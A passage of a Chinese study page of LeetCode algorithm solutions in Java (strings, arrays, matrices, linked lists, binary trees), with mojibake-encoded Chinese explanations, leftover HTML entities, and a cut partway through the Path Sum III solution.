å°†æ•´æ•°åˆ†æˆå·¦å³ä¸¤éƒ¨åˆ†ï¼Œå³è¾¹é‚£éƒ¨åˆ†éœ€è¦è½¬ç½®ï¼Œç„¶ååˆ¤æ–­è¿™ä¸¤éƒ¨åˆ†æ˜¯å¦ç›¸ç­‰ã€‚ 1234567891011121314public boolean isPalindrome(int x) &#123; if (x == 0) &#123; return true; &#125; if (x &lt; 0 || x % 10 == 0) &#123; return false; &#125; int right = 0; while (x &gt; right) &#123; right = right * 10 + x % 10; x /= 10; &#125; return x == right || x == right / 10;&#125; ç»Ÿè®¡äºŒè¿›åˆ¶å­—ç¬¦ä¸²ä¸­è¿ç»­ 1 å’Œè¿ç»­ 0 æ•°é‡ç›¸åŒçš„å­å­—ç¬¦ä¸²ä¸ªæ•° 696. Count Binary Substrings (Easy) 123Input: "00110011"Output: 6Explanation: There are 6 substrings that have equal number of consecutive 1's and 0's: "0011", "01", "1100", "10", "0011", and "01". 12345678910111213141516public int countBinarySubstrings(String s) &#123; int preLen = 0, curLen = 1, count = 0; for (int i = 1; i &lt; s.length(); i++) &#123; if (s.charAt(i) == s.charAt(i - 1)) &#123; curLen++; &#125; else &#123; preLen = curLen; curLen = 1; &#125; if (preLen &gt;= curLen) &#123; count++; &#125; &#125; return count;&#125; å­—ç¬¦ä¸²å¾ªç¯ç§»ä½åŒ…å« ç¼–ç¨‹ä¹‹ç¾ï¼š3.1 12s1 = AABCD, s2 = CDAAReturn : true ç»™å®šä¸¤ä¸ªå­—ç¬¦ä¸² s1 å’Œ s2ï¼Œè¦æ±‚åˆ¤å®š s2 æ˜¯å¦èƒ½å¤Ÿè¢« s1 åšå¾ªç¯ç§»ä½å¾—åˆ°çš„å­—ç¬¦ä¸²åŒ…å«ã€‚ s1 è¿›è¡Œå¾ªç¯ç§»ä½çš„ç»“æœæ˜¯ s1s1 çš„å­å­—ç¬¦ä¸²ï¼Œå› æ­¤åªè¦åˆ¤æ–­ s2 æ˜¯å¦æ˜¯ s1s1 çš„å­å­—ç¬¦ä¸²å³å¯ã€‚ å­—ç¬¦ä¸²å¾ªç¯ç§»ä½ ç¼–ç¨‹ä¹‹ç¾ï¼š2.17 12s = "abcd123" k = 3Return "123abcd" å°†å­—ç¬¦ä¸²å‘å³å¾ªç¯ç§»åŠ¨ k ä½ã€‚ å°† abcd123 ä¸­çš„ abcd å’Œ 123 å•ç‹¬é€†åºï¼Œå¾—åˆ° dcba321ï¼Œç„¶åå¯¹æ•´ä¸ªå­—ç¬¦ä¸²è¿›è¡Œé€†åºï¼Œå¾—åˆ° 123abcdã€‚ å­—ç¬¦ä¸²ä¸­å•è¯çš„ç¿»è½¬ ç¨‹åºå‘˜ä»£ç é¢è¯•æŒ‡å— 12s = "I am a student"return "student a am I" å°†æ¯ä¸ªå•è¯é€†åºï¼Œç„¶åå°†æ•´ä¸ªå­—ç¬¦ä¸²é€†åºã€‚ æ•°ç»„ä¸çŸ©é˜µæŠŠæ•°ç»„ä¸­çš„ 0 ç§»åˆ°æœ«å°¾ 283. Move Zeroes (Easy) 1For example, given nums = [0, 1, 0, 3, 12], after calling your function, nums should be [1, 3, 12, 0, 0]. 1234567891011public void moveZeroes(int[] nums) &#123; int idx = 0; for (int num : nums) &#123; if (num != 0) &#123; nums[idx++] = num; &#125; &#125; while (idx &lt; nums.length) &#123; nums[idx++] = 0; &#125;&#125; æ”¹å˜çŸ©é˜µç»´åº¦ 566. Reshape the Matrix (Easy) 1234567891011Input:nums =[[1,2], [3,4]]r = 1, c = 4Output:[[1,2,3,4]]Explanation:The row-traversing of nums is [1,2,3,4]. The new reshaped matrix is a 1 * 4 matrix, fill it row by row by using the previous list. 123456789101112131415public int[][] matrixReshape(int[][] nums, int r, int c) &#123; int m = nums.length, n = nums[0].length; if (m * n != r * c) &#123; return nums; &#125; int[][] reshapedNums = new int[r][c]; int index = 0; for (int i = 0; i &lt; r; i++) &#123; for (int j = 0; j &lt; c; j++) &#123; reshapedNums[i][j] = nums[index / n][index % n]; index++; &#125; &#125; return reshapedNums;&#125; æ‰¾å‡ºæ•°ç»„ä¸­æœ€é•¿çš„è¿ç»­ 1 485. Max Consecutive Ones (Easy) 12345678public int findMaxConsecutiveOnes(int[] nums) &#123; int max = 0, cur = 0; for (int x : nums) &#123; cur = x == 0 ? 0 : cur + 1; max = Math.max(max, cur); &#125; return max;&#125; ä¸€ä¸ªæ•°ç»„å…ƒç´ åœ¨ [1, n] ä¹‹é—´ï¼Œå…¶ä¸­ä¸€ä¸ªæ•°è¢«æ›¿æ¢ä¸ºå¦ä¸€ä¸ªæ•°ï¼Œæ‰¾å‡ºé‡å¤çš„æ•°å’Œä¸¢å¤±çš„æ•° 645. Set Mismatch (Easy) 12Input: nums = [1,2,2,4]Output: [2,3] 12Input: nums = [1,2,2,4]Output: [2,3] æœ€ç›´æ¥çš„æ–¹æ³•æ˜¯å…ˆå¯¹æ•°ç»„è¿›è¡Œæ’åºï¼Œè¿™ç§æ–¹æ³•æ—¶é—´å¤æ‚åº¦ä¸º O(NlogN)ã€‚æœ¬é¢˜å¯ä»¥ä»¥ O(N) çš„æ—¶é—´å¤æ‚åº¦ã€O(1) ç©ºé—´å¤æ‚åº¦æ¥æ±‚è§£ã€‚ ä¸»è¦æ€æƒ³æ˜¯é€šè¿‡äº¤æ¢æ•°ç»„å…ƒç´ ï¼Œä½¿å¾—æ•°ç»„ä¸Šçš„å…ƒç´ åœ¨æ­£ç¡®çš„ä½ç½®ä¸Šã€‚éå†æ•°ç»„ï¼Œå¦‚æœç¬¬ i ä½ä¸Šçš„å…ƒç´ ä¸æ˜¯ i + 1ï¼Œé‚£ä¹ˆä¸€ç›´äº¤æ¢ç¬¬ i ä½å’Œ nums[i] - 1 ä½ç½®ä¸Šçš„å…ƒç´ ã€‚ 12345678910111213141516171819public int[] findErrorNums(int[] nums) &#123; for (int i = 0; i &lt; nums.length; i++) &#123; while (nums[i] != i + 1 &amp;&amp; nums[nums[i] - 1] != nums[i]) &#123; swap(nums, i, nums[i] - 1); &#125; &#125; for (int i = 0; i &lt; nums.length; i++) &#123; if (nums[i] != i + 1) &#123; return new int[]&#123;nums[i], i + 1&#125;; &#125; &#125; return null;&#125;private void swap(int[] nums, int i, int j) &#123; int tmp = nums[i]; nums[i] = nums[j]; nums[j] = tmp;&#125; ç±»ä¼¼é¢˜ç›®ï¼š 448. Find All Numbers Disappeared in an Array (Easy)ï¼Œå¯»æ‰¾æ‰€æœ‰ä¸¢å¤±çš„å…ƒç´  442. Find All Duplicates in an Array (Medium)ï¼Œå¯»æ‰¾æ‰€æœ‰é‡å¤çš„å…ƒç´ ã€‚ æ‰¾å‡ºæ•°ç»„ä¸­é‡å¤çš„æ•°ï¼Œæ•°ç»„å€¼åœ¨ [1, n] ä¹‹é—´ 287. Find the Duplicate Number (Medium) è¦æ±‚ä¸èƒ½ä¿®æ”¹æ•°ç»„ï¼Œä¹Ÿä¸èƒ½ä½¿ç”¨é¢å¤–çš„ç©ºé—´ã€‚ äºŒåˆ†æŸ¥æ‰¾è§£æ³•ï¼š 12345678910111213public int findDuplicate(int[] nums) &#123; int l = 1, h = nums.length - 1; while (l &lt;= h) &#123; int mid = l + (h - l) / 2; int cnt = 0; for (int i = 0; i &lt; nums.length; i++) &#123; if (nums[i] &lt;= mid) cnt++; &#125; if (cnt &gt; mid) h = mid - 1; else l = mid + 1; &#125; return l;&#125; åŒæŒ‡é’ˆè§£æ³•ï¼Œç±»ä¼¼äºæœ‰ç¯é“¾è¡¨ä¸­æ‰¾å‡ºç¯çš„å…¥å£ï¼š 12345678910111213public int findDuplicate(int[] nums) &#123; int slow = nums[0], fast = nums[nums[0]]; while (slow != fast) &#123; slow = nums[slow]; fast = nums[nums[fast]]; &#125; fast = 0; while (slow != fast) &#123; slow = nums[slow]; fast = nums[fast]; &#125; return slow;&#125; æœ‰åºçŸ©é˜µæŸ¥æ‰¾ 240. Search a 2D Matrix II (Medium) 12345[ [ 1, 5, 9], [10, 11, 13], [12, 13, 15]] 1234567891011public boolean searchMatrix(int[][] matrix, int target) &#123; if (matrix == null || matrix.length == 0 || matrix[0].length == 0) return false; int m = matrix.length, n = matrix[0].length; int row = 0, col = n - 1; while (row &lt; m &amp;&amp; col &gt;= 0) &#123; if (target == matrix[row][col]) return true; else if (target &lt; matrix[row][col]) col--; else row++; &#125; return false;&#125; æœ‰åºçŸ©é˜µçš„ Kth Element 378. Kth Smallest Element in a Sorted Matrix ((Medium)) 12345678matrix = [ [ 1, 5, 9], [10, 11, 13], [12, 13, 15]],k = 8,return 13. è§£é¢˜å‚è€ƒï¼šShare my thoughts and Clean Java Code äºŒåˆ†æŸ¥æ‰¾è§£æ³•ï¼š 12345678910111213141516public int kthSmallest(int[][] matrix, int k) &#123; int m = matrix.length, n = matrix[0].length; int lo = matrix[0][0], hi = matrix[m - 1][n - 1]; while(lo &lt;= hi) &#123; int mid = lo + (hi - lo) / 2; int cnt = 0; for(int i = 0; i &lt; m; i++) &#123; for(int j = 0; j &lt; n &amp;&amp; matrix[i][j] &lt;= mid; j++) &#123; cnt++; &#125; &#125; if(cnt &lt; k) lo = mid + 1; else hi = mid - 1; &#125; return lo;&#125; å †è§£æ³•ï¼š 1234567891011121314151617181920212223public int kthSmallest(int[][] matrix, int k) &#123; int m = matrix.length, n = matrix[0].length; PriorityQueue&lt;Tuple&gt; pq = new PriorityQueue&lt;Tuple&gt;(); for(int j = 0; j &lt; n; j++) pq.offer(new Tuple(0, j, matrix[0][j])); for(int i = 0; i &lt; k - 1; i++) &#123; // å°æ ¹å †ï¼Œå»æ‰ k - 1 ä¸ªå †é¡¶å…ƒç´ ï¼Œæ­¤æ—¶å †é¡¶å…ƒç´ å°±æ˜¯ç¬¬ k çš„æ•° Tuple t = pq.poll(); if(t.x == m - 1) continue; pq.offer(new Tuple(t.x + 1, t.y, matrix[t.x + 1][t.y])); &#125; return pq.poll().val;&#125;class Tuple implements Comparable&lt;Tuple&gt; &#123; int x, y, val; public Tuple(int x, int y, int val) &#123; this.x = x; this.y = y; this.val = val; &#125; @Override public int compareTo(Tuple that) &#123; return this.val - that.val; &#125;&#125; æ•°ç»„ç›¸é‚»å·®å€¼çš„ä¸ªæ•° 667. Beautiful Arrangement II (Medium) 123Input: n = 3, k = 2Output: [1, 3, 2]Explanation: The [1, 3, 2] has three different positive integers ranging from 1 to 3, and the [2, 1] has exactly 2 distinct integers: 1 and 2. é¢˜ç›®æè¿°ï¼šæ•°ç»„å…ƒç´ ä¸º 1~n çš„æ•´æ•°ï¼Œè¦æ±‚æ„å»ºæ•°ç»„ï¼Œä½¿å¾—ç›¸é‚»å…ƒç´ çš„å·®å€¼ä¸ç›¸åŒçš„ä¸ªæ•°ä¸º kã€‚ è®©å‰ k+1 ä¸ªå…ƒç´ æ„å»ºå‡º k ä¸ªä¸ç›¸åŒçš„å·®å€¼ï¼Œåºåˆ—ä¸ºï¼š1 k+1 2 k 3 k-1 â€¦ k/2 k/2+1. 1234567891011public int[] constructArray(int n, int k) &#123; int[] ret = new int[n]; ret[0] = 1; for (int i = 1, interval = k; i &lt;= k; i++, interval--) &#123; ret[i] = i % 2 == 1 ? ret[i - 1] + interval : ret[i - 1] - interval; &#125; for (int i = k + 1; i &lt; n; i++) &#123; ret[i] = i + 1; &#125; return ret;&#125; æ•°ç»„çš„åº¦ 697. Degree of an Array (Easy) 12Input: [1,2,2,3,1,4,2]Output: 6 é¢˜ç›®æè¿°ï¼šæ•°ç»„çš„åº¦å®šä¹‰ä¸ºå…ƒç´ å‡ºç°çš„æœ€é«˜é¢‘ç‡ï¼Œä¾‹å¦‚ä¸Šé¢çš„æ•°ç»„åº¦ä¸º 3ã€‚è¦æ±‚æ‰¾åˆ°ä¸€ä¸ªæœ€å°çš„å­æ•°ç»„ï¼Œè¿™ä¸ªå­æ•°ç»„çš„åº¦å’ŒåŸæ•°ç»„ä¸€æ ·ã€‚ 12345678910111213141516171819202122232425public int findShortestSubArray(int[] nums) &#123; Map&lt;Integer, Integer&gt; numsCnt = new HashMap&lt;&gt;(); Map&lt;Integer, Integer&gt; numsLastIndex = new HashMap&lt;&gt;(); Map&lt;Integer, Integer&gt; numsFirstIndex = new HashMap&lt;&gt;(); for (int i = 0; i &lt; nums.length; i++) &#123; int num = nums[i]; numsCnt.put(num, numsCnt.getOrDefault(num, 0) + 1); numsLastIndex.put(num, i); if (!numsFirstIndex.containsKey(num)) &#123; numsFirstIndex.put(num, i); &#125; &#125; int maxCnt = 0; for (int num : nums) &#123; maxCnt = Math.max(maxCnt, numsCnt.get(num)); &#125; int ret = nums.length; for (int i = 0; i &lt; nums.length; i++) &#123; int num = nums[i]; int cnt = numsCnt.get(num); if (cnt != maxCnt) continue; ret = Math.min(ret, numsLastIndex.get(num) - numsFirstIndex.get(num) + 1); &#125; return ret;&#125; å¯¹è§’å…ƒç´ ç›¸ç­‰çš„çŸ©é˜µ 766. Toeplitz Matrix (Easy) 12345123451239512In the above grid, the diagonals are "[9]", "[5, 5]", "[1, 1, 1]", "[2, 2, 2]", "[3, 3]", "[4]", and in each diagonal all elements are the same, so the answer is True. 1234567891011121314151617181920212223public boolean isToeplitzMatrix(int[][] matrix) &#123; for (int i = 0; i &lt; matrix[0].length; i++) &#123; if (!check(matrix, matrix[0][i], 0, i)) &#123; return false; &#125; &#125; for (int i = 0; i &lt; matrix.length; i++) &#123; if (!check(matrix, matrix[i][0], i, 0)) &#123; return false; &#125; &#125; return true;&#125;private boolean check(int[][] matrix, int expectValue, int row, int col) &#123; if (row &gt;= matrix.length || col &gt;= matrix[0].length) &#123; return true; &#125; if (matrix[row][col] != expectValue) &#123; return false; &#125; return check(matrix, expectValue, row + 1, col + 1);&#125; åµŒå¥—æ•°ç»„ 565. Array Nesting (Medium) 1234567Input: A = [5,4,0,3,1,6,2]Output: 4Explanation:A[0] = 5, A[1] = 4, A[2] = 0, A[3] = 3, A[4] = 1, A[5] = 6, A[6] = 2.One of the longest S[K]:S[0] = &#123;A[0], A[5], A[6], A[2]&#125; = &#123;5, 6, 2, 0&#125; é¢˜ç›®æè¿°ï¼šS[i] è¡¨ç¤ºä¸€ä¸ªé›†åˆï¼Œé›†åˆçš„ç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯ A[i]ï¼Œç¬¬äºŒä¸ªå…ƒç´ æ˜¯ A[A[i]]ï¼Œå¦‚æ­¤åµŒå¥—ä¸‹å»ã€‚æ±‚æœ€å¤§çš„ S[i]ã€‚ 123456789101112131415public int arrayNesting(int[] nums) &#123; int max = 0; for (int i = 0; i &lt; nums.length; i++) &#123; int cnt = 0; for (int j = i; nums[j] != -1; ) &#123; cnt++; int t = nums[j]; nums[j] = -1; // æ ‡è®°è¯¥ä½ç½®å·²ç»è¢«è®¿é—® j = t; &#125; max = Math.max(max, cnt); &#125; return max;&#125; åˆ†éš”æ•°ç»„ 769. Max Chunks To Make Sorted (Medium) 12345Input: arr = [1,0,2,3,4]Output: 4Explanation:We can split into two chunks, such as [1, 0], [2, 3, 4].However, splitting into [1, 0], [2], [3], [4] is the highest number of chunks possible. é¢˜ç›®æè¿°ï¼šåˆ†éš”æ•°ç»„ï¼Œä½¿å¾—å¯¹æ¯éƒ¨åˆ†æ’åºåæ•°ç»„å°±ä¸ºæœ‰åºã€‚ 12345678910public int maxChunksToSorted(int[] arr) &#123; if (arr == null) return 0; int ret = 0; int right = arr[0]; for (int i = 0; i &lt; arr.length; i++) &#123; right = Math.max(right, arr[i]); if (right == i) ret++; &#125; return ret;&#125; é“¾è¡¨é“¾è¡¨æ˜¯ç©ºèŠ‚ç‚¹ï¼Œæˆ–è€…æœ‰ä¸€ä¸ªå€¼å’Œä¸€ä¸ªæŒ‡å‘ä¸‹ä¸€ä¸ªé“¾è¡¨çš„æŒ‡é’ˆï¼Œå› æ­¤å¾ˆå¤šé“¾è¡¨é—®é¢˜å¯ä»¥ç”¨é€’å½’æ¥å¤„ç†ã€‚ æ‰¾å‡ºä¸¤ä¸ªé“¾è¡¨çš„äº¤ç‚¹ 160. Intersection of Two Linked Lists (Easy) 12345A: a1 â†’ a2 â†˜ c1 â†’ c2 â†’ c3 â†—B: b1 â†’ b2 â†’ b3 è¦æ±‚ï¼šæ—¶é—´å¤æ‚åº¦ä¸º O(N)ï¼Œç©ºé—´å¤æ‚åº¦ä¸º O(1) è®¾ A çš„é•¿åº¦ä¸º a + cï¼ŒB çš„é•¿åº¦ä¸º b + cï¼Œå…¶ä¸­ c ä¸ºå°¾éƒ¨å…¬å…±éƒ¨åˆ†é•¿åº¦ï¼Œå¯çŸ¥ a + c + b = b + c + aã€‚ å½“è®¿é—® A é“¾è¡¨çš„æŒ‡é’ˆè®¿é—®åˆ°é“¾è¡¨å°¾éƒ¨æ—¶ï¼Œä»¤å®ƒä»é“¾è¡¨ B çš„å¤´éƒ¨å¼€å§‹è®¿é—®é“¾è¡¨ Bï¼›åŒæ ·åœ°ï¼Œå½“è®¿é—® B é“¾è¡¨çš„æŒ‡é’ˆè®¿é—®åˆ°é“¾è¡¨å°¾éƒ¨æ—¶ï¼Œä»¤å®ƒä»é“¾è¡¨ A çš„å¤´éƒ¨å¼€å§‹è®¿é—®é“¾è¡¨ Aã€‚è¿™æ ·å°±èƒ½æ§åˆ¶è®¿é—® A å’Œ B ä¸¤ä¸ªé“¾è¡¨çš„æŒ‡é’ˆèƒ½åŒæ—¶è®¿é—®åˆ°äº¤ç‚¹ã€‚ 12345678public ListNode getIntersectionNode(ListNode headA, ListNode headB) &#123; ListNode l1 = headA, l2 = headB; while (l1 != l2) &#123; l1 = (l1 == null) ? headB : l1.next; l2 = (l2 == null) ? headA : l2.next; &#125; return l1;&#125; å¦‚æœåªæ˜¯åˆ¤æ–­æ˜¯å¦å­˜åœ¨äº¤ç‚¹ï¼Œé‚£ä¹ˆå°±æ˜¯å¦ä¸€ä¸ªé—®é¢˜ï¼Œå³ ç¼–ç¨‹ä¹‹ç¾ï¼š3.6 çš„é—®é¢˜ã€‚æœ‰ä¸¤ç§è§£æ³•ï¼šæŠŠç¬¬ä¸€ä¸ªé“¾è¡¨çš„ç»“å°¾è¿æ¥åˆ°ç¬¬äºŒä¸ªé“¾è¡¨çš„å¼€å¤´ï¼Œçœ‹ç¬¬äºŒä¸ªé“¾è¡¨æ˜¯å¦å­˜åœ¨ç¯ï¼›æˆ–è€…ç›´æ¥æ¯”è¾ƒä¸¤ä¸ªé“¾è¡¨çš„æœ€åä¸€ä¸ªèŠ‚ç‚¹æ˜¯å¦ç›¸åŒã€‚ é“¾è¡¨åè½¬ 206. Reverse Linked List (Easy) é€’å½’ 12345678910public ListNode reverseList(ListNode head) &#123; if (head == null || head.next == null) &#123; return head; &#125; ListNode next = head.next; ListNode newHead = reverseList(next); next.next = head; head.next = null; return newHead;&#125; å¤´æ’æ³• 12345678910public ListNode reverseList(ListNode head) &#123; ListNode newHead = new ListNode(-1); while (head != null) &#123; ListNode next = head.next; head.next = newHead.next; newHead.next = head; head = next; &#125; return newHead.next;&#125; å½’å¹¶ä¸¤ä¸ªæœ‰åºçš„é“¾è¡¨ 21. Merge Two Sorted Lists (Easy) 1234567891011public ListNode mergeTwoLists(ListNode l1, ListNode l2) &#123; if (l1 == null) return l2; if (l2 == null) return l1; if (l1.val &lt; l2.val) &#123; l1.next = mergeTwoLists(l1.next, l2); return l1; &#125; else &#123; l2.next = mergeTwoLists(l1, l2.next); return l2; &#125;&#125; ä»æœ‰åºé“¾è¡¨ä¸­åˆ é™¤é‡å¤èŠ‚ç‚¹ 83. Remove Duplicates from Sorted List (Easy) 12Given 1-&gt;1-&gt;2, return 1-&gt;2.Given 1-&gt;1-&gt;2-&gt;3-&gt;3, return 1-&gt;2-&gt;3. 12345public ListNode deleteDuplicates(ListNode head) &#123; if(head == null || head.next == null) return head; head.next = deleteDuplicates(head.next); return head.val == head.next.val ? head.next : head;&#125; åˆ é™¤é“¾è¡¨çš„å€’æ•°ç¬¬ n ä¸ªèŠ‚ç‚¹ 19. Remove Nth Node From End of List (Medium) 12Given linked list: 1-&gt;2-&gt;3-&gt;4-&gt;5, and n = 2.After removing the second node from the end, the linked list becomes 1-&gt;2-&gt;3-&gt;5. 1234567891011121314public ListNode removeNthFromEnd(ListNode head, int n) &#123; ListNode fast = head; while (n-- &gt; 0) &#123; fast = fast.next; &#125; if (fast == null) return head.next; ListNode slow = head; while (fast.next != null) &#123; fast = fast.next; slow = slow.next; &#125; slow.next = slow.next.next; return head;&#125; äº¤æ¢é“¾è¡¨ä¸­çš„ç›¸é‚»ç»“ç‚¹ 24. Swap Nodes in Pairs (Medium) 1Given 1-&gt;2-&gt;3-&gt;4, you should return the list as 2-&gt;1-&gt;4-&gt;3. é¢˜ç›®è¦æ±‚ï¼šä¸èƒ½ä¿®æ”¹ç»“ç‚¹çš„ val å€¼ï¼ŒO(1) ç©ºé—´å¤æ‚åº¦ã€‚ 123456789101112131415public ListNode swapPairs(ListNode head) &#123; ListNode node = new ListNode(-1); node.next = head; ListNode pre = node; while (pre.next != null &amp;&amp; pre.next.next != null) &#123; ListNode l1 = pre.next, l2 = pre.next.next; ListNode next = l2.next; l1.next = next; l2.next = l1; pre.next = l2; pre = l1; &#125; return node.next;&#125; é“¾è¡¨æ±‚å’Œ 445. Add Two Numbers II (Medium) 12Input: (7 -&gt; 2 -&gt; 4 -&gt; 3) + (5 -&gt; 6 -&gt; 4)Output: 7 -&gt; 8 -&gt; 0 -&gt; 7 é¢˜ç›®è¦æ±‚ï¼šä¸èƒ½ä¿®æ”¹åŸå§‹é“¾è¡¨ã€‚ 12345678910111213141516171819202122232425public ListNode addTwoNumbers(ListNode l1, ListNode l2) &#123; Stack&lt;Integer&gt; l1Stack = buildStack(l1); Stack&lt;Integer&gt; l2Stack = buildStack(l2); ListNode head = new ListNode(-1); int carry = 0; while (!l1Stack.isEmpty() || !l2Stack.isEmpty() || carry != 0) &#123; int x = l1Stack.isEmpty() ? 0 : l1Stack.pop(); int y = l2Stack.isEmpty() ? 0 : l2Stack.pop(); int sum = x + y + carry; ListNode node = new ListNode(sum % 10); node.next = head.next; head.next = node; carry = sum / 10; &#125; return head.next;&#125;private Stack&lt;Integer&gt; buildStack(ListNode l) &#123; Stack&lt;Integer&gt; stack = new Stack&lt;&gt;(); while (l != null) &#123; stack.push(l.val); l = l.next; &#125; return stack;&#125; å›æ–‡é“¾è¡¨ 234. Palindrome Linked List (Easy) é¢˜ç›®è¦æ±‚ï¼šä»¥ O(1) çš„ç©ºé—´å¤æ‚åº¦æ¥æ±‚è§£ã€‚ åˆ‡æˆä¸¤åŠï¼ŒæŠŠååŠæ®µåè½¬ï¼Œç„¶åæ¯”è¾ƒä¸¤åŠæ˜¯å¦ç›¸ç­‰ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738public boolean isPalindrome(ListNode head) &#123; if (head == null || head.next == null) return true; ListNode slow = head, fast = head.next; while (fast != null &amp;&amp; fast.next != null) &#123; slow = slow.next; fast = fast.next.next; &#125; if (fast != null) slow = slow.next; // å¶æ•°èŠ‚ç‚¹ï¼Œè®© slow æŒ‡å‘ä¸‹ä¸€ä¸ªèŠ‚ç‚¹ cut(head, slow); // åˆ‡æˆä¸¤ä¸ªé“¾è¡¨ return isEqual(head, reverse(slow));&#125;private void cut(ListNode head, ListNode cutNode) &#123; while (head.next != cutNode) &#123; head = head.next; &#125; head.next = null;&#125;private ListNode reverse(ListNode head) &#123; ListNode newHead = null; while (head != null) &#123; ListNode nextNode = head.next; head.next = newHead; newHead = head; head = nextNode; &#125; return newHead;&#125;private boolean isEqual(ListNode l1, ListNode l2) &#123; while (l1 != null &amp;&amp; l2 != null) &#123; if (l1.val != l2.val) return false; l1 = l1.next; l2 = l2.next; &#125; return true;&#125; åˆ†éš”é“¾è¡¨ 725. Split Linked List in Parts(Medium) 12345Input:root = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10], k = 3Output: [[1, 2, 3, 4], [5, 6, 7], [8, 9, 10]]Explanation:The input has been split into consecutive parts with size difference at most 1, and earlier parts are a larger size than the later parts. é¢˜ç›®æè¿°ï¼šæŠŠé“¾è¡¨åˆ†éš”æˆ k éƒ¨åˆ†ï¼Œæ¯éƒ¨åˆ†çš„é•¿åº¦éƒ½åº”è¯¥å°½å¯èƒ½ç›¸åŒï¼Œæ’åœ¨å‰é¢çš„é•¿åº¦åº”è¯¥å¤§äºç­‰äºåé¢çš„ã€‚ 1234567891011121314151617181920212223public ListNode[] splitListToParts(ListNode root, int k) &#123; int N = 0; ListNode cur = root; while (cur != null) &#123; N++; cur = cur.next; &#125; int mod = N % k; int size = N / k; ListNode[] ret = new ListNode[k]; cur = root; for (int i = 0; cur != null &amp;&amp; i &lt; k; i++) &#123; ret[i] = cur; int curSize = size + (mod-- &gt; 0 ? 1 : 0); for (int j = 0; j &lt; curSize - 1; j++) &#123; cur = cur.next; &#125; ListNode next = cur.next; cur.next = null; cur = next; &#125; return ret;&#125; é“¾è¡¨å…ƒç´ æŒ‰å¥‡å¶èšé›† 328. Odd Even Linked List (Medium) 123Example:Given 1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;NULL,return 1-&gt;3-&gt;5-&gt;2-&gt;4-&gt;NULL. 1234567891011121314public ListNode oddEvenList(ListNode head) &#123; if (head == null) &#123; return head; &#125; ListNode odd = head, even = head.next, evenHead = even; while (even != null &amp;&amp; even.next != null) &#123; odd.next = odd.next.next; odd = odd.next; even.next = even.next.next; even = even.next; &#125; odd.next = evenHead; return head;&#125; æ ‘é€’å½’ä¸€æ£µæ ‘è¦ä¹ˆæ˜¯ç©ºæ ‘ï¼Œè¦ä¹ˆæœ‰ä¸¤ä¸ªæŒ‡é’ˆï¼Œæ¯ä¸ªæŒ‡é’ˆæŒ‡å‘ä¸€æ£µæ ‘ã€‚æ ‘æ˜¯ä¸€ç§é€’å½’ç»“æ„ï¼Œå¾ˆå¤šæ ‘çš„é—®é¢˜å¯ä»¥ä½¿ç”¨é€’å½’æ¥å¤„ç†ã€‚ æ ‘çš„é«˜åº¦ 104. Maximum Depth of Binary Tree (Easy) 1234public int maxDepth(TreeNode root) &#123; if (root == null) return 0; return Math.max(maxDepth(root.left), maxDepth(root.right)) + 1;&#125; å¹³è¡¡æ ‘ 110. Balanced Binary Tree (Easy) 12345 3 / \9 20 / \ 15 7 å¹³è¡¡æ ‘å·¦å³å­æ ‘é«˜åº¦å·®éƒ½å°äºç­‰äº 1 1234567891011121314private boolean result = true;public boolean isBalanced(TreeNode root) &#123; maxDepth(root); return result;&#125;public int maxDepth(TreeNode root) &#123; if (root == null) return 0; int l = maxDepth(root.left); int r = maxDepth(root.right); if (Math.abs(l - r) &gt; 1) result = false; return 1 + Math.max(l, r);&#125; ä¸¤èŠ‚ç‚¹çš„æœ€é•¿è·¯å¾„ 543. Diameter of Binary Tree (Easy) 123456789Input: 1 / \ 2 3 / \ 4 5Return 3, which is the length of the path [4,2,1,3] or [5,2,1,3]. 1234567891011121314private int max = 0;public int diameterOfBinaryTree(TreeNode root) &#123; depth(root); return max;&#125;private int depth(TreeNode root) &#123; if (root == null) return 0; int leftDepth = depth(root.left); int rightDepth = depth(root.right); max = Math.max(max, leftDepth + rightDepth); return Math.max(leftDepth, rightDepth) + 1;&#125; ç¿»è½¬æ ‘ 226. Invert Binary Tree (Easy) 1234567public TreeNode invertTree(TreeNode root) &#123; if (root == null) return null; TreeNode left = root.left; // åé¢çš„æ“ä½œä¼šæ”¹å˜ left æŒ‡é’ˆï¼Œå› æ­¤å…ˆä¿å­˜ä¸‹æ¥ root.left = invertTree(root.right); root.right = invertTree(left); return root;&#125; å½’å¹¶ä¸¤æ£µæ ‘ 617. Merge Two Binary Trees (Easy) 1234567891011121314Input: Tree 1 Tree 2 1 2 / \ / \ 3 2 1 3 / \ \ 5 4 7Output:Merged tree: 3 / \ 4 5 / \ \ 5 4 7 123456789public TreeNode mergeTrees(TreeNode t1, TreeNode t2) &#123; if (t1 == null &amp;&amp; t2 == null) return null; if (t1 == null) return t2; if (t2 == null) return t1; TreeNode root = new TreeNode(t1.val + t2.val); root.left = mergeTrees(t1.left, t2.left); root.right = mergeTrees(t1.right, t2.right); return root;&#125; åˆ¤æ–­è·¯å¾„å’Œæ˜¯å¦ç­‰äºä¸€ä¸ªæ•° Leetcdoe : 112. Path Sum (Easy) 123456789Given the below binary tree and sum = 22, 5 / \ 4 8 / / \ 11 13 4 / \ \ 7 2 1return true, as there exist a root-to-leaf path 5-&gt;4-&gt;11-&gt;2 which sum is 22. è·¯å¾„å’Œå®šä¹‰ä¸ºä» root åˆ° leaf çš„æ‰€æœ‰èŠ‚ç‚¹çš„å’Œ 12345public boolean hasPathSum(TreeNode root, int sum) &#123; if (root == null) return false; if (root.left == null &amp;&amp; root.right == null &amp;&amp; root.val == sum) return true; return hasPathSum(root.left, sum - root.val) || hasPathSum(root.right, sum - root.val);&#125; ç»Ÿè®¡è·¯å¾„å’Œç­‰äºä¸€ä¸ªæ•°çš„è·¯å¾„æ•°é‡ 437. Path Sum III (Easy) 123456789101112131415root = [10,5,-3,3,2,null,11,3,-2,null,1], sum = 8 10 / \ 5 -3 / \ \ 3 2 11 / \ \3 -2 1Return 3. The paths that sum to 8 are:1. 5 -&gt; 32. 5 -&gt; 2 -&gt; 13. -3 -&gt; 11 è·¯å¾„ä¸ä¸€å®šä»¥ root å¼€å¤´ï¼Œä¹Ÿä¸ä¸€å®šä»¥ leaf ç»“å°¾ï¼Œä½†æ˜¯å¿…é¡»è¿ç»­ã€‚ 12345678910111213public int pathSum(TreeNode root, int sum) &#123; if (root == null) return 0; int ret = pathSumStartWithRoot(root, sum) + pathSum(root.left, sum) + pathSum(root.right, 